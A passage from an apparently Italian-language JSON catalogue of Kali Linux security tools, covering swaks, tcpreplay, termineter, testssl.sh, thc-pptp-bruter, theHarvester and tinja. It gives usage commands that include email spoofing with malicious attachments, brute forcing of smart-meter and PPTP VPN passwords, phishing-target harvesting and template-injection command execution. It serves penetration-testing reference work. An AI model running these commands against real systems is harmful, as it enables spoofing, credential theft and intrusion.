di header, body, allegati e envelope. Questo include la possibilita di impostare mittenti arbitrari per testare SPF/DKIM/DMARC, aggiungere header personalizzati, e includere allegati con MIME type specifici per testare filtri di contenuto.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Swaks si utilizza da riga di comando con un'ampia gamma di opzioni per controllare ogni aspetto della comunicazione SMTP.</p><pre><code># Test base di invio email\nswaks --to victim@target.com --from test@domain.com --server mail.target.com\n\n# Test open relay (mittente e destinatario esterni)\nswaks --to external@gmail.com --from spoofed@other.com --server mail.target.com\n\n# Test autenticazione con credenziali\nswaks --to user@target.com --server mail.target.com --auth LOGIN --auth-user admin --auth-password pass123\n\n# Invio con STARTTLS forzato\nswaks --to user@target.com --server mail.target.com --tls --tls-verify\n\n# Email con allegato e header personalizzato\nswaks --to victim@target.com --from ceo@company.com --server mail.target.com --attach payload.pdf --header \"Subject: Documento urgente\" --header \"X-Priority: 1\"\n\n# Test SPF con mittente spoofato\nswaks --to test@target.com --from admin@target.com --server mail.target.com --ehlo attacker.com</code></pre><p>L'output mostra l'intera conversazione SMTP con codici di risposta, permettendo di identificare esattamente dove il server accetta o rifiuta le operazioni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security audit di mail server</strong>, Swaks verifica se il server consente relay aperti, accetta autenticazione su canali non cifrati, o permette spoofing di mittenti interni. In scenari di <strong>phishing simulation</strong>, lo strumento testa l'efficacia dei controlli SPF, DKIM e DMARC inviando email con mittenti falsificati per verificare se raggiungono le caselle di posta o vengono bloccate. Per <strong>penetration testing</strong>, Swaks puo essere usato per inviare email contenenti payload malevoli come allegati o link, testando i filtri di contenuto e le sandbox anti-malware del mail gateway.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Tutte le email inviate vengono registrate nei log del server SMTP con timestamp, IP sorgente e dettagli della transazione. I mail gateway moderni analizzano header, contenuto e allegati, potendo bloccare e segnalare tentativi sospetti. Le email spoofate falliscono tipicamente i controlli SPF/DKIM se inviati da IP non autorizzati.</p><p><strong>Impatto operativo:</strong> L'invio di email di test puo generare alert nei sistemi di sicurezza del cliente. Email con allegati malevoli possono essere quarantinate e analizzate dai team SOC. L'IP del tester rimane visibile negli header Received delle email consegnate.</p><p><strong>Mitigazioni:</strong> Utilizzare un dominio di test con record SPF validi per ridurre la possibilita di blocco. Coordinare con il team del cliente per escludere l'IP del tester dai filtri durante il test. Utilizzare STARTTLS per cifrare la comunicazione ed evitare intercettazione delle credenziali di test.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "tcpreplay",
    "name": "tcpreplay",
    "version": "4.5.1",
    "icon": "../app/icons/tcpreplay-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tcpreplay/",
    "desc": "Riproduce catture pcap su rete per test IDS/IPS e replay di attacchi registrati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>tcpreplay</strong> e una suite completa per la riproduzione e manipolazione di traffico di rete catturato in file pcap. Lo strumento permette di reiniettare catture di traffico su interfacce di rete reali, consentendo il testing di dispositivi di sicurezza come IDS, IPS e firewall in condizioni realistiche. La suite include tcpreplay per la riproduzione, tcprewrite per la modifica di pacchetti, tcpprep per la classificazione del traffico e tcpbridge per il bridging. La capacita di controllare velocita, timing e contenuto dei pacchetti lo rende essenziale per validare le capacita di detection di sistemi di sicurezza.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Replay Controllato:</strong> tcpreplay permette di riprodurre catture pcap a velocita variabile: dalla velocita originale fino a rate massimi dell'hardware di rete. I moltiplicatori di velocita e i limiti di packet-per-second permettono di testare dispositivi di sicurezza sotto diversi livelli di carico, identificando limiti di performance e condizioni in cui pacchetti vengono persi.</p><p><strong>Modifica Pacchetti con tcprewrite:</strong> Il componente tcprewrite permette di modificare IP sorgente e destinazione, MAC address, porte e altri campi dei pacchetti prima del replay. Questo e fondamentale per adattare catture da un ambiente all'altro, randomizzare indirizzi per evitare blacklisting e creare varianti di attacchi noti per testare la flessibilita delle regole di detection.</p><p><strong>Replay Bidirezionale:</strong> tcpreplay supporta la riproduzione su due interfacce simultanee, separando traffico client e server. Questo permette di testare dispositivi inline come IPS e firewall in modo realistico, con il traffico che attraversa il dispositivo come in una rete di produzione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>tcpreplay richiede privilegi root e accesso alle interfacce di rete. Le catture pcap possono provenire da Wireshark, tcpdump o repository pubblici di attacchi noti.</p><pre><code># Replay base su interfaccia\nsudo tcpreplay -i eth0 capture.pcap\n\n# Replay alla massima velocita possibile\nsudo tcpreplay -i eth0 --topspeed capture.pcap\n\n# Replay a 10x la velocita originale\nsudo tcpreplay -i eth0 --multiplier=10 capture.pcap\n\n# Loop continuo per stress testing\nsudo tcpreplay -i eth0 --loop=0 --topspeed capture.pcap\n\n# Modifica IP prima del replay\nsudo tcprewrite --infile=original.pcap --outfile=modified.pcap --srcipmap=10.0.0.0/8:192.168.1.0/24 --dstipmap=172.16.0.0/12:10.0.0.0/8\n\n# Replay bidirezionale su due interfacce\nsudo tcpreplay -i eth0 -I eth1 capture.pcap</code></pre><p>Per test IDS, e consigliabile utilizzare catture pcap contenenti attacchi noti da repository come MACCDC o Malware Traffic Analysis per validare le regole di detection.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>testing IDS/IPS</strong>, tcpreplay riproduce catture contenenti attacchi noti (exploit, malware C2, exfiltration) per verificare che le regole di detection generino gli alert attesi. Questo permette di validare la copertura delle signature dopo aggiornamenti o modifiche alla configurazione. Per <strong>SOC training</strong>, lo strumento genera traffico realistico contenente attacchi mescolati a traffico legittimo, creando scenari di esercitazione per analisti che devono identificare e triaggiare gli incidenti. Per <strong>performance testing</strong>, il replay a velocita elevate permette di determinare i limiti di throughput di dispositivi di sicurezza inline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico reiniettato puo contenere timestamp e pattern non coerenti con il traffico di rete corrente, rendendolo potenzialmente identificabile. I pacchetti replay possono interferire con connessioni attive se gli indirizzi IP coincidono con host reali sulla rete.</p><p><strong>Impatto operativo:</strong> Il replay ad alta velocita puo saturare la banda di rete e impattare servizi di produzione. I dispositivi IDS/IPS possono generare un volume elevato di alert durante il testing, potenzialmente mascherando incidenti reali. E fondamentale eseguire test su segmenti di rete isolati o durante finestre di manutenzione.</p><p><strong>Mitigazioni:</strong> Utilizzare tcprewrite per modificare gli indirizzi IP e MAC in modo da non conflittare con host di produzione. Eseguire il replay su reti di test isolate. Coordinare con i team SOC per segnalare le finestre di testing e evitare falsi allarmi operativi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "termineter",
    "name": "termineter",
    "version": "1.0.6",
    "icon": "../app/icons/termineter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/termineter/",
    "desc": "Framework pentesting smart meter via protocolli AMI: C12.18, C12.19, ANSI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Termineter</strong> e un framework specializzato per il security assessment di smart meter e sistemi AMI (Advanced Metering Infrastructure) utilizzati nelle reti elettriche intelligenti. Lo strumento supporta i protocolli ANSI C12.18 e C12.19, standard di comunicazione per contatori elettrici in Nord America, permettendo di interagire direttamente con i dispositivi tramite interfacce ottiche o seriali. Termineter consente di leggere tabelle dati, testare meccanismi di autenticazione, eseguire brute force di password e verificare la sicurezza complessiva dei contatori intelligenti. Rappresenta uno degli unici strumenti open source dedicati alla sicurezza dell'infrastruttura energetica.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Protocolli ANSI C12.18/C12.19:</strong> Termineter implementa i protocolli standard per la comunicazione con smart meter nordamericani. C12.18 gestisce il trasporto su interfaccia ottica seriale, mentre C12.19 definisce la struttura delle tabelle dati. Lo strumento permette di leggere e scrivere tabelle, testare diversi livelli di accesso e verificare l'implementazione della sicurezza del protocollo.</p><p><strong>Brute Force Autenticazione:</strong> Lo strumento include funzionalita di brute force per testare la robustezza delle password configurate sui contatori. Molti smart meter utilizzano password di default o deboli, e Termineter permette di verificare se queste sono state modificate. Supporta wordlist personalizzate e diversi livelli di autenticazione del protocollo C12.18.</p><p><strong>Lettura e Analisi Tabelle:</strong> I contatori intelligenti organizzano i dati in tabelle standardizzate (Table 0 per informazioni generali, Table 1 per parametri del dispositivo, e cosi via). Termineter permette di leggere queste tabelle per estrarre informazioni come versione firmware, configurazione di rete, dati di consumo e parametri di sicurezza, fornendo un quadro completo dello stato del dispositivo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Termineter richiede una sonda ottica USB per la connessione fisica al contatore. L'interfaccia e interattiva, simile a Metasploit, con comandi per navigare le funzionalita.</p><pre><code># Avvia il framework interattivo\ntermineter\n\n# Connessione via interfaccia ottica seriale\nconnect --serial /dev/ttyUSB0 --baudrate 9600\n\n# Login con password di default\nlogin --password 00000000 --level 2\n\n# Lettura tabella informazioni generali (Table 0)\nread_table 0\n\n# Lettura tabella parametri dispositivo\nread_table 1\n\n# Brute force password con wordlist\nbrute_force --wordlist /usr/share/wordlists/meter_passwords.txt --level 2\n\n# Disconnessione sicura\nlogoff</code></pre><p>E fondamentale documentare ogni operazione eseguita durante l'assessment e ottenere autorizzazione scritta prima di interagire con contatori in produzione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security assessment di utility</strong>, Termineter verifica la sicurezza dei contatori elettrici intelligenti installati, controllando che le password di default siano state modificate, che i livelli di accesso siano configurati correttamente e che le tabelle sensibili siano protette. Per <strong>assessment di infrastruttura critica ICS/SCADA</strong>, lo strumento fa parte della metodologia di testing delle smart grid, valutando i rischi di manipolazione dei dati di consumo, interruzione del servizio e accesso non autorizzato all'infrastruttura AMI. Per <strong>ricerca sulla sicurezza energetica</strong>, Termineter permette di analizzare implementazioni dei protocolli C12 per identificare vulnerabilita architetturali e proporre miglioramenti agli standard.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'accesso fisico al contatore e il requisito principale e rappresenta anche il fattore di rischio maggiore per il tester. I contatori possono registrare tentativi di accesso e login falliti nei log interni. I sistemi AMI centrali possono rilevare anomalie nelle comunicazioni con i contatori periferici.</p><p><strong>Impatto operativo:</strong> Comandi errati possono alterare la configurazione del contatore, causare malfunzionamenti o interruzione del servizio. La scrittura su tabelle critiche puo modificare parametri di fatturazione o configurazione di rete. Il brute force puo attivare meccanismi di lockout che richiedono intervento del personale utility per il ripristino.</p><p><strong>Mitigazioni:</strong> Operare esclusivamente su contatori di laboratorio o contatori dismessi per la fase di familiarizzazione. Ottenere autorizzazione scritta dalla utility prima di testare contatori in produzione. Documentare lo stato iniziale di ogni tabella prima di qualsiasi modifica. Evitare operazioni di scrittura durante assessment iniziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "testssl.sh",
    "name": "testssl.sh",
    "version": "3.2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/testssl.sh/",
    "desc": "Script bash per test completo TLS/SSL: cipher, vulnerabilità, certificate chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>testssl.sh</strong> e uno script bash completo e autonomo per il testing approfondito di configurazioni SSL/TLS. A differenza di altri strumenti simili, non richiede dipendenze esterne oltre a OpenSSL, rendendolo facilmente portatile e utilizzabile su qualsiasi sistema Unix-like. Lo strumento esegue oltre 400 test individuali coprendo cipher suite, versioni di protocollo, vulnerabilita note (Heartbleed, POODLE, ROBOT, BEAST, CRIME, BREACH, DROWN), analisi del certificato, certificate chain, HSTS, HPKP, OCSP stapling e molto altro. L'output colorato e formattato e disponibile anche in formato JSON, CSV e HTML per l'integrazione in pipeline automatizzate e la generazione di report professionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Test Completo Senza Dipendenze:</strong> testssl.sh utilizza esclusivamente OpenSSL per tutti i test, senza richiedere librerie Python, Ruby o Java. Include una copia statica di OpenSSL per garantire il supporto di protocolli legacy (SSLv2, SSLv3) anche su sistemi che li hanno disabilitati. Questo approccio garantisce risultati consistenti indipendentemente dalla configurazione del sistema operativo.</p><p><strong>Vulnerability Detection Estesa:</strong> Lo strumento testa tutte le vulnerabilita SSL/TLS note con nome proprio: Heartbleed (CVE-2014-0160), CCS Injection (CVE-2014-0224), ROBOT, POODLE, BEAST, CRIME, BREACH, DROWN, FREAK, Logjam, Sweet32 e LUCKY13. Per ogni vulnerabilita fornisce una spiegazione del rischio e dell'impatto, facilitando la comprensione anche per personale non tecnico.</p><p><strong>Output Multi-Formato per Automazione:</strong> I risultati possono essere esportati in JSON (flat o pretty), CSV e HTML con severity rating. Il formato JSON e ideale per l'integrazione in pipeline CI/CD, sistemi SIEM e dashboard di monitoraggio continuo della sicurezza TLS. Il rating severity (LOW, MEDIUM, HIGH, CRITICAL) facilita la prioritizzazione delle remediation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>testssl.sh si esegue direttamente come script bash. Supporta sia singoli target che scansioni batch di multiple destinazioni.</p><pre><code># Test completo di un target HTTPS\ntestssl.sh https://target.com\n\n# Solo test vulnerabilita note\ntestssl.sh --vulnerable target.com:443\n\n# Output JSON per automazione\ntestssl.sh --jsonfile results.json target.com\n\n# Output HTML per report\ntestssl.sh --htmlfile report.html target.com\n\n# Test STARTTLS per server email\ntestssl.sh --starttls smtp mail.target.com:25\n\n# Scan batch da file di host\ntestssl.sh --file hosts.txt --jsonfile batch_results.json\n\n# Solo cipher e protocolli (test rapido)\ntestssl.sh --protocols --ciphers target.com\n\n# Con severity rating\ntestssl.sh --severity HIGH target.com</code></pre><p>L'esecuzione completa di tutti i test richiede tipicamente 2-5 minuti per target. Per scansioni batch, lo strumento supporta esecuzione parallela tramite l'opzione --parallel.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>compliance audit PCI-DSS e HIPAA</strong>, testssl.sh verifica i requisiti specifici di cifratura e protocollo richiesti dagli standard di conformita. Il report generato documenta lo stato di ogni controllo, facilitando la compilazione della documentazione di compliance. Per <strong>security assessment continuo</strong>, lo strumento si integra in pipeline CI/CD per verificare automaticamente che le configurazioni TLS di nuovi deployment rispettino le policy aziendali. Per <strong>incident response</strong>, permette di verificare rapidamente se un server e vulnerabile a exploit SSL/TLS specifici durante la risposta a un incidente di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo strumento genera decine di connessioni TLS con cipher e protocolli diversi in rapida successione, un pattern facilmente identificabile da sistemi di monitoraggio. I log del server web registrano ogni tentativo di connessione TLS, inclusi i fallimenti per protocolli non supportati.</p><p><strong>Impatto operativo:</strong> I test per vulnerabilita come Heartbleed inviano pacchetti specifici che possono essere rilevati da IDS/IPS come tentativi di exploit. Alcuni test possono causare la disconnessione di sessioni TLS attive su server con implementazioni fragili. Il volume di connessioni puo attivare meccanismi di rate limiting.</p><p><strong>Mitigazioni:</strong> Coordinare con il team di sicurezza del target per whitelist dell'IP del tester. Utilizzare l'opzione --quiet per ridurre il numero di connessioni ai test essenziali. Eseguire i test durante finestre di manutenzione per minimizzare l'impatto su servizi di produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "thc-pptp-bruter",
    "name": "thc-pptp-bruter",
    "version": "0.1.4",
    "icon": "../app/icons/thc-pptp-bruter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/thc-pptp-bruter/",
    "desc": "Brute force su VPN PPTP per testare password deboli su gateway aziendali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>THC-PPTP-Bruter</strong> e uno strumento specializzato nel brute force di credenziali su gateway VPN che utilizzano il protocollo PPTP (Point-to-Point Tunneling Protocol). Sviluppato dal gruppo THC (The Hacker's Choice), questo tool sfrutta le debolezze intrinseche dell'autenticazione MS-CHAPv2 utilizzata da PPTP per testare sistematicamente combinazioni di username e password. A differenza di strumenti generici di brute force, THC-PPTP-Bruter e ottimizzato specificamente per il protocollo PPTP, gestendo correttamente l'handshake GRE e la negoziazione PPP. Lo strumento e particolarmente efficace contro gateway VPN aziendali legacy che ancora utilizzano PPTP nonostante le sue vulnerabilita note, ed e in grado di testare migliaia di credenziali in modo efficiente grazie al supporto per connessioni parallele e alla gestione intelligente dei timeout.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Brute Force MS-CHAPv2:</strong> THC-PPTP-Bruter implementa nativamente lo stack di autenticazione MS-CHAPv2 utilizzato dai server PPTP. Questo permette di eseguire attacchi dizionario e brute force senza dipendere da librerie esterne per la negoziazione del protocollo. Il tool gestisce automaticamente la sequenza challenge-response tipica di MS-CHAPv2, estraendo gli hash necessari per la validazione delle credenziali.</p><p><strong>Connessioni Parallele e Rate Control:</strong> Lo strumento supporta connessioni multiple simultanee per massimizzare la velocita dell'attacco. E possibile configurare il numero di thread paralleli per bilanciare velocita e stealth, adattandosi alle capacita del target e alle policy di lockout. Il rate control intelligente previene il sovraccarico del gateway VPN durante il testing.</p><p><strong>Gestione Protocollo GRE/PPP:</strong> PPTP utilizza un canale di controllo TCP sulla porta 1723 e un tunnel dati GRE per l'incapsulamento PPP. THC-PPTP-Bruter gestisce entrambi i canali correttamente, mantenendo lo stato della connessione e handling degli errori di protocollo. Questo approccio nativo garantisce risultati affidabili rispetto a wrapper generici che possono perdere sincronizzazione con il protocollo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>THC-PPTP-Bruter viene tipicamente utilizzato durante penetration test esterni quando viene identificato un gateway VPN PPTP esposto su Internet. Il tool richiede come minimo un indirizzo target e una wordlist di password da testare.</p><pre><code># Brute force con username singolo e wordlist\nthc-pptp-bruter -u admin -w /usr/share/wordlists/rockyou.txt vpn.target.com\n\n# Specificare porta custom (default 1723)\nthc-pptp-bruter -u admin -w passwords.txt -p 1723 vpn.target.com\n\n# Modalita verbose per debug\nthc-pptp-bruter -v -u admin -w passwords.txt vpn.target.com\n\n# Con numero massimo di connessioni parallele\nthc-pptp-bruter -n 5 -u admin -w passwords.txt vpn.target.com</code></pre><p>E fondamentale verificare le policy di account lockout prima di lanciare l'attacco. Molti gateway VPN bloccano gli account dopo un numero limitato di tentativi falliti, rendendo necessario un approccio slow-and-low con intervalli tra i tentativi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto di un <strong>assessment VPN aziendale</strong>, THC-PPTP-Bruter viene utilizzato per verificare la robustezza delle credenziali di accesso VPN. Molte organizzazioni mantengono gateway PPTP legacy per compatibilita con client datati, e questi endpoint spesso non implementano autenticazione multi-fattore, rendendoli vulnerabili ad attacchi brute force. Lo strumento e anche impiegato durante <strong>penetration test perimetrali</strong> per identificare credenziali deboli che potrebbero fornire accesso iniziale alla rete interna. In scenari di <strong>compliance audit</strong>, il tool verifica che le policy di password siano applicate correttamente anche sui servizi VPN, spesso trascurati rispetto ad altri punti di ingresso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I gateway VPN enterprise loggano ogni tentativo di autenticazione con timestamp, IP sorgente e username utilizzato. Tentativi multipli falliti generano alert nei sistemi SIEM e possono attivare regole di blocco automatico basate su IP o account. Il traffico GRE e le connessioni TCP ripetute alla porta 1723 sono facilmente identificabili da IDS/IPS perimetrali.</p><p><strong>Impatto operativo:</strong> Policy di account lockout possono bloccare account legittimi durante il testing, causando disservizi per gli utenti reali della VPN. Il protocollo PPTP e considerato deprecato e intrinsecamente insicuro; la sua presenza stessa costituisce una finding di sicurezza. Attacchi brute force intensivi possono degradare le performance del gateway VPN.</p><p><strong>Mitigazioni:</strong> Utilizzare rate limiting aggressivo con lunghe pause tra i tentativi per evitare lockout. Coordinare il testing con il team IT per definire finestre di manutenzione appropriate. Preferire un approccio password spraying con poche password comuni su molti account piuttosto che molte password su un singolo account. Verificare preventivamente le policy di lockout con il cliente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "theharvester",
    "name": "theharvester",
    "version": "4.8.2",
    "icon": "../app/icons/theharvester-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/theharvester/",
    "desc": "Raccoglie email, subdomain, IP da fonti pubbliche: Google, Bing, LinkedIn, Shodan.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>TheHarvester</strong> e uno degli strumenti OSINT piu consolidati e utilizzati nella fase di reconnaissance passiva. Progettato per raccogliere informazioni pubblicamente disponibili su un dominio target, lo strumento interroga simultaneamente decine di fonti pubbliche tra cui motori di ricerca (Google, Bing, DuckDuckGo), database di sicurezza (Shodan, Censys, VirusTotal), piattaforme professionali (LinkedIn) e servizi specializzati (Hunter.io, SecurityTrails). TheHarvester estrae email, nomi di dipendenti, subdomain, indirizzi IP e virtual host associati al target, costruendo un profilo completo della superficie di attacco esterna dell'organizzazione. Lo strumento e scritto in Python e viene costantemente aggiornato con nuovi moduli per supportare fonti emergenti, mantenendosi rilevante nel panorama OSINT in continua evoluzione.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Raccolta Multi-Sorgente:</strong> TheHarvester interroga simultaneamente oltre 30 fonti pubbliche differenti, aggregando i risultati in un output unificato. Ogni fonte viene gestita da un modulo dedicato che implementa le specifiche API o tecniche di scraping necessarie. Questo approccio multi-sorgente garantisce una copertura completa, poiche informazioni non disponibili in una fonte possono essere presenti in un'altra, riducendo i falsi negativi nella fase di reconnaissance.</p><p><strong>Email Harvesting e Validazione:</strong> La funzionalita principale e l'estrazione di indirizzi email associati al dominio target da risultati di ricerca, paste sites, e database di breach pubblici. Gli indirizzi raccolti possono essere utilizzati per costruire liste di target per campagne di social engineering, identificare pattern di naming convention email dell'organizzazione (nome.cognome@, iniziale.cognome@), e mappare la struttura organizzativa dell'azienda target.</p><p><strong>Subdomain Discovery e DNS Resolution:</strong> Oltre alle email, TheHarvester esegue discovery di subdomain attraverso certificate transparency logs, DNS brute force opzionale, e risultati dei motori di ricerca. I subdomain scoperti vengono automaticamente risolti per ottenere gli indirizzi IP corrispondenti, permettendo di mappare l'infrastruttura esposta e identificare servizi potenzialmente vulnerabili non ancora catalogati dall'organizzazione target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>TheHarvester si utilizza dalla riga di comando specificando il dominio target e le fonti da interrogare. Il parametro -b definisce le fonti, mentre -l limita il numero di risultati per sorgente.</p><pre><code># Harvesting da tutte le fonti disponibili\ntheHarvester -d target.com -b all\n\n# Solo motori di ricerca specifici\ntheHarvester -d target.com -b google,bing,duckduckgo\n\n# LinkedIn per nomi di dipendenti\ntheHarvester -d target.com -b linkedin\n\n# Con limite risultati e output HTML\ntheHarvester -d target.com -b all -l 500 -f report.html\n\n# Usando Shodan per host e servizi\ntheHarvester -d target.com -b shodan\n\n# DNS brute force aggiuntivo\ntheHarvester -d target.com -b all -c</code></pre><p>Molte fonti richiedono API key configurate nel file di configurazione api-keys.yaml. Senza chiavi API, diverse fonti restituiranno risultati limitati o nulli. E consigliabile configurare le API key prima dell'utilizzo per massimizzare i risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>reconnaissance iniziale</strong> di un penetration test, TheHarvester viene utilizzato come primo strumento per costruire il profilo del target. Le email raccolte alimentano campagne di phishing mirate durante test di social engineering, mentre i subdomain scoperti ampliano la superficie di attacco da esplorare. In contesti di <strong>threat intelligence</strong>, lo strumento monitora l'esposizione informativa di un'organizzazione, identificando dati sensibili come indirizzi email di dirigenti o infrastruttura non documentata. Per attivita di <strong>bug bounty</strong>, TheHarvester accelera la fase di scope enumeration scoprendo asset in-scope che potrebbero essere sfuggiti alla documentazione ufficiale del programma.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> TheHarvester opera in modo prevalentemente passivo, interrogando fonti terze senza contattare direttamente l'infrastruttura del target. Tuttavia, alcune fonti come DNS brute force (-c) e la risoluzione DNS dei subdomain generano query dirette verso i nameserver del target, che possono essere loggate. Le query ai motori di ricerca possono essere associate all'IP dell'operatore se non si utilizza un proxy.</p><p><strong>Impatto operativo:</strong> L'utilizzo intensivo senza API key puo causare blocchi temporanei da parte dei motori di ricerca (CAPTCHA, ban IP). Le fonti con API key hanno rate limit specifici che, se superati, possono invalidare la chiave. I risultati possono contenere informazioni obsolete o false che richiedono validazione manuale.</p><p><strong>Mitigazioni:</strong> Utilizzare API key dedicate per ogni fonte per massimizzare i risultati e rispettare i rate limit. Instradare il traffico attraverso VPN o proxy per separare l'attivita OSINT dall'identita operativa. Validare sempre i risultati con fonti multiple prima di utilizzarli in fasi successive dell'engagement. Conservare i risultati in modo sicuro poiche possono contenere PII.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "tinja",
    "name": "tinja",
    "version": "1.2.0",
    "icon": "../app/icons/tinja-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tinja/",
    "desc": "Rileva e exploita Server-Side Template Injection in framework web comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Tinja</strong> e uno strumento automatizzato per il rilevamento e lo sfruttamento di vulnerabilita Server-Side Template Injection (SSTI) nelle applicazioni web. Le vulnerabilita SSTI si verificano quando input utente viene incorporato direttamente nei template lato server senza adeguata sanitizzazione, permettendo a un attaccante di iniettare espressioni che vengono eseguite dal motore di template. Tinja supporta i principali template engine utilizzati in applicazioni web moderne, tra cui Jinja2 (Python/Flask), Twig (PHP/Symfony), Freemarker (Java), Velocity (Java), Smarty (PHP), Pebble (Java) e Mako (Python). Lo strumento automatizza il processo di detection attraverso payload polyglot e tecniche di fingerprinting che identificano il motore di template specifico, per poi generare payload di exploitation ottimizzati per ottenere Remote Code Execution sul server target.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Rilevamento Automatico del Template Engine:</strong> Tinja utilizza un albero decisionale basato sull'analisi differenziale delle risposte per identificare il template engine in uso. Inietta espressioni matematiche e operatori specifici di ciascun motore, analizzando come il server elabora l'input per dedurre la tecnologia sottostante. Questo approccio e piu affidabile rispetto al semplice pattern matching sulle risposte di errore, poiche funziona anche quando i messaggi di errore sono soppressi.</p><p><strong>Generazione Payload Multi-Engine:</strong> Una volta identificato il template engine, Tinja genera automaticamente payload ottimizzati per ottenere command execution. Per ogni motore supportato, lo strumento mantiene una libreria di tecniche di sandbox escape e catene di oggetti che permettono di raggiungere l'esecuzione di comandi di sistema. I payload vengono testati progressivamente, partendo da tecniche meno invasive fino a catene di exploitation complete.</p><p><strong>Supporto Polyglot e Bypass Filtri:</strong> Tinja include payload polyglot che funzionano su piu template engine contemporaneamente, utili nella fase iniziale di detection quando il motore non e ancora identificato. Inoltre, implementa tecniche di bypass per filtri e WAF comuni, come l'encoding alternativo delle espressioni, l'utilizzo di attributi interni degli oggetti, e la concatenazione di stringhe per evitare pattern di blocco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Tinja richiede come input un URL con un punto di injection identificato dal marcatore INJECT, oppure un file di request HTTP completo per scenari piu complessi con header custom o cookie di autenticazione.</p><pre><code># Scan parametro GET per SSTI\ntinja url -u \"http://target.com/page?name=TINJA\"\n\n# Scan con metodo POST e dati\ntinja url -u \"http://target.com/page\" -d \"name=TINJA\" -m POST\n\n# Utilizzando un file di request Burp\ntinja raw -r request.txt\n\n# Forzare un template engine specifico\ntinja url -u \"http://target.com/page?name=TINJA\" --engine jinja2\n\n# Esecuzione comando dopo exploitation\ntinja url -u \"http://target.com/page?name=TINJA\" --cmd \"id\"</code></pre><p>Il marcatore TINJA nell'URL indica il punto dove verranno iniettati i payload di test. E consigliabile testare ogni parametro singolarmente per evitare interferenze tra injection point multipli.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>web application penetration test</strong>, Tinja viene impiegato per testare sistematicamente tutti i parametri di input che potrebbero essere riflessi attraverso un template engine. Le SSTI sono particolarmente comuni in applicazioni che generano contenuti dinamici come email personalizzate, report PDF, e pagine di errore custom. Nel contesto di <strong>bug bounty</strong>, Tinja accelera la verifica di potenziali SSTI individuate manualmente, confermando la vulnerabilita e determinando il livello di impatto attraverso l'esecuzione di comandi. Per attivita di <strong>security code review</strong>, i payload generati da Tinja possono essere utilizzati come casi di test per validare l'efficacia dei controlli di sanitizzazione implementati dagli sviluppatori.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload SSTI contengono pattern distintivi come doppie parentesi graffe ({{}}), espressioni matematiche come {{7*7}}, e riferimenti a oggetti interni del template engine. Questi pattern sono facilmente rilevabili da WAF e sistemi di log analysis. L'esecuzione di comandi di sistema lascia tracce nei log del server e puo attivare sistemi di monitoraggio dell'integrita dei file.</p><p><strong>Impatto operativo:</strong> Una SSTI sfruttata con successo fornisce tipicamente Remote Code Execution con 